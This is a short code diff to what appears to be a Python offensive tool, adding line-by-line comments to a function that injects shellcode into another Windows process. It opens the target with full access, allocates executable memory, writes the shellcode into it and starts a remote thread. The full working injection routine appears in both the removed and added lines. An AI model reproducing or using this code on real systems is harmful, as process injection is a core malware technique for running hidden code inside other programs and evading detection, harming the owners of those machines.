@@ -31,10 +31,10 @@ def generateShellcode(cmdString):
 	
 # Injects shellcode: Takes in shellcode as string, converts to bytearray
 def injectShellcode(pid, shellcode):
-	shellCode = bytearray(shellcode)   
-	process_handle = windll.kernel32.OpenProcess(0x1F0FFF, False, pid)	
-	memory_allocation_variable = windll.kernel32.VirtualAllocEx(process_handle, None, len(shellcode), 0x1000, 0x40)
-	windll.kernel32.WriteProcessMemory(process_handle, memory_allocation_variable, shellcode, len(shellcode), None)
-	if not windll.kernel32.CreateRemoteThread(process_handle, None, 0, memory_allocation_variable, None, 0, None):
+	shellCode = bytearray(shellcode)   	
+	process_handle = windll.kernel32.OpenProcess(0x1F0FFF, False, pid)	#get handle of target process
+	memory_allocation_variable = windll.kernel32.VirtualAllocEx(process_handle, None, len(shellcode), 0x1000, 0x40) #allocate memory for shellcode in target process
+	windll.kernel32.WriteProcessMemory(process_handle, memory_allocation_variable, shellcode, len(shellcode), None) #write shellcode into allocated memory
+	if not windll.kernel32.CreateRemoteThread(process_handle, None, 0, memory_allocation_variable, None, 0, None): #start thread with injected code
 		return False
 	return True
